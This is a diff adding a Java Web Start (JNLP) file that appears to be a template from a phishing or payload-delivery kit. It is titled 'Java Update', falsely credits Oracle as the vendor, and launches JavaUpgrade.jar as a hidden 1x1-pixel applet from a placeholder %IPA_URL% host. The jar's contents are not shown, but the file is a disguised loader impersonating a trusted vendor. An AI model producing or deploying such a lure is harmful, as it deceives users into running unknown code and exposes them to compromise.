@@ -1,0 +1,23 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<jnlp
+   codebase="%IPA_URL%/"
+   href="JavaUpgrade.jnlp">
+	
+   <information>
+      <title>Java Update</title>
+      <vendor>Oracle and/or its affiliates.</vendor> 
+   </information>
+	
+   <resources>
+      <java version="1.6+"/>
+      <jar href="JavaUpgrade.jar" />
+   </resources>
+	
+   <applet-desc main-class="WebEnhancer" 
+      width='1' 
+      height='1'
+      name="WebEnhancer"
+      documentBase="%IPA_URL%/"
+      jnlp_href="%IPA_URL%/JavaUpgrade.jnlp"
+      archive="JavaUpgrade.jar" />
+</jnlp>
